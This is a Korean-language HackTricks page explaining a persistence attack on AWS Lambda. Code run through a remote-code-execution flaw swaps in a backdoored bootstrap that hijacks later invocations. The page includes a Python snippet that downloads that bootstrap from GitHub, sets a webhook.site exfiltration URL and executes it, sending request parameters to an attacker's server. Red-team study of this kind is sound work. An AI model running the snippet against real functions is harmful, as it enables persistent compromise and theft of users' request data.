# AWS - 람다 요청 도용

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 <strong>AWS 해킹을 처음부터 전문가까지 배우세요</strong>!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 람다 플로우

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer**는 **init** 프로세스로 **호출**을 보내는 컨테이너 외부의 프로세스입니다.
2. init 프로세스는 몇 가지 흥미로운 엔드포인트를 노출하는 **9001** 포트에서 수신 대기합니다:
* **`/2018-06-01/runtime/invocation/next`** – 다음 호출 이벤트를 가져옵니다.
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** – 호출에 대한 핸들러 응답 반환
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** – 실행 오류 반환
3. **bootstrap.py**는 init 프로세스에서 호출을 받아 사용자 코드를 처리하는 루프를 가지고 있습니다 (**`/next`**).
4. 마지막으로 **bootstrap.py**는 응답을 init에게 보냅니다.

bootstrap은 사용자 코드를 모듈로로드하므로 사용자 코드에 의해 수행된 모든 코드 실행은 실제로 이 프로세스에서 발생합니다.

## 람다 요청 도용

이 공격의 목표는 사용자 코드가 취약한 요청을 처리하는 **`bootstrap.py`** 프로세스 내에서 악성 **`bootstrap.py`** 프로세스를 실행하도록 만드는 것입니다. 이렇게 하면 **악성 bootstrap** 프로세스가 요청을 처리하기 위해 init 프로세스와 **통신**을 시작하고 **합법적인** bootstrap은 악성 프로세스를 실행하는 동안 **갇혀** 있어 init 프로세스에 요청을 요청하지 않을 것입니다.

사용자 코드의 코드가 합법적인 **`bootstrap.py`** 프로세스에 의해 실행되고 있기 때문에 이 작업을 달성하는 것은 간단합니다. 따라서 공격자는 다음을 수행할 수 있습니다:

* 현재 호출의 가짜 결과를 init 프로세스에 **보내어** init이 bootstrap 프로세스가 더 많은 호출을 기다리고 있다고 생각하게 합니다.
* 요청은 **`/${invoke-id}/response`**로 보내야 합니다.
* invoke-id는 합법적인 **`bootstrap.py`** 프로세스의 스택에서 [**inspect**](https://docs.python.org/3/library/inspect.html) 파이썬 모듈을 사용하여 얻을 수 있습니다 ([여기에서 제안된대로](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)) 또는 단순히 다시 **`/2018-06-01/runtime/invocation/next`**로 요청하여 얻을 수 있습니다 ([여기에서 제안된대로](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)).
* 다음 호출을 처리할 악성 **`boostrap.py`**를 실행합니다.
* 은밀성을 위해 람다 호출 매개변수를 공격자가 제어하는 C2로 보내고 그런 다음 요청을 처리할 수 있습니다.
* 이 공격에는 시스템 또는 [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py)에서 **`bootstrap.py`**의 원본 코드를 얻어 악성 코드를 추가하고 현재 람다 호출에서 실행하는 것이 충분합니다.

### 공격 단계

1. **RCE** 취약점을 찾습니다.
2. **악의적인** **bootstrap**을 생성합니다 (예: [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. 악의적인 bootstrap을 **실행**합니다.

이러한 작업을 쉽게 수행할 수 있습니다.
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
더 많은 정보는 [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)에서 확인하세요.

## 참고 자료

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)
